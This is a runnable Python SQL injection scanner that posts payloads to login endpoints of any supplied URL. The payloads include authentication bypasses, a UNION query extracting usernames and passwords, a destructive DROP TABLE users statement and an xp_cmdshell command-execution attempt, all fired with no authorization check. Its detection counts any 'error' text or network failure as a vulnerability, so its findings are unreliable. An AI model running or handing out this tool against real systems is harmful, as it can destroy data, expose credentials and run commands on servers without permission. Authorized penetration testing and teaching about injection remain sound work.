# sql_injection_tester_improved.py
import sys
import requests
from urllib.parse import urljoin
from typing import Optional, Tuple

class SQLInjectionTester:
    """
    Automated tester for common SQL Injection patterns against given endpoints.

    Usage:
        python sql_injection_tester_improved.py <base_url> [endpoints...]
    Example:
        python sql_injection_tester_improved.py https://example.com/login /login /admin
    """
    def __init__(self, base_url: str, endpoints: list[str] = None, timeout: float = 5.0):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.timeout = timeout
        # default to root path if no endpoints provided
        self.endpoints = endpoints if endpoints else ['/']

        # Map descriptive test names to test functions
        self.tests = {
            'Basic SQL Injection Test':         self._classic_sql_injection,
            'OR-Condition Injection Test':      self._or_condition_injection,
            'UNION-Based Injection Test':       self._union_based_injection,
            'DROP-TABLE Injection Test':        self._drop_table_injection,
            'Comment-Based Injection Test':     self._comment_based_injection,
            'Always-True Condition Injection':  self._always_true_condition,
            'Semicolon-Comment Injection Test': self._semicolon_comment_injection,
            'Command-Execution Injection Test': self._xp_cmdshell_injection,
        }

    def _post(self, path: str, data: dict) -> requests.Response:
        """
        Send POST to base_url+path with given form data.
        Raises HTTPError on non-2xx.
        """
        url = urljoin(self.base_url, path)
        resp = self.session.post(url, data=data, timeout=self.timeout)
        resp.raise_for_status()
        return resp

    def _test_payload(self, payload: str) -> Tuple[bool, Optional[str]]:
        """
        Test a single payload against all endpoints. Returns (vulnerable, payload) if error or SQL indication.
        """
        for path in self.endpoints:
            data = {'username': payload, 'password': 'password'}
            try:
                resp = self._post(path, data)
                body = resp.text.lower()
                # look for common SQL error indicators
                if any(keyword in body for keyword in ('error', 'mysql', 'syntax', 'sql')):
                    return True, payload
            except requests.RequestException:
                # network or HTTP error suggests payload may have triggered an issue
                return True, payload
        return False, None

    # Individual payload tests
    def _classic_sql_injection(self):
        return self._test_payload("' OR 1=1 -- ")

    def _or_condition_injection(self):
        return self._test_payload("' OR 'a'='a")

    def _union_based_injection(self):
        return self._test_payload("' UNION SELECT NULL,username,password FROM users -- ")

    def _drop_table_injection(self):
        return self._test_payload("'; DROP TABLE users -- ")

    def _comment_based_injection(self):
        return self._test_payload("admin'-- ")

    def _always_true_condition(self):
        return self._test_payload("' OR '1'='1' -- ")

    def _semicolon_comment_injection(self):
        return self._test_payload("'; -- ")

    def _xp_cmdshell_injection(self):
        return self._test_payload("'; EXEC xp_cmdshell('whoami') -- ")

    def run_all(self) -> dict:
        """
        Execute all defined SQL injection tests and print results.
        Returns a dict mapping test names to (vuln, info).
        """
        print(f"Testing SQL Injection on: {self.base_url}")
        results: dict[str, tuple[bool, str | None]] = {}
        for name, test_fn in self.tests.items():
            vuln, info = test_fn()
            status = 'True' if vuln else 'False'
            info_str = info if info else 'None'
            print(f"{name:35s} → vulnerability:{status}   info={info_str}")
            results[name] = (vuln, info)
        return results

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(SQLInjectionTester.__doc__ or "Usage: python sql_injection_tester_improved.py <base_url> [endpoints...]")
        sys.exit(1)

    base = sys.argv[1]
    endpoints = sys.argv[2:] if len(sys.argv) > 2 else None
    tester = SQLInjectionTester(base_url=base, endpoints=endpoints)
    tester.run_all()
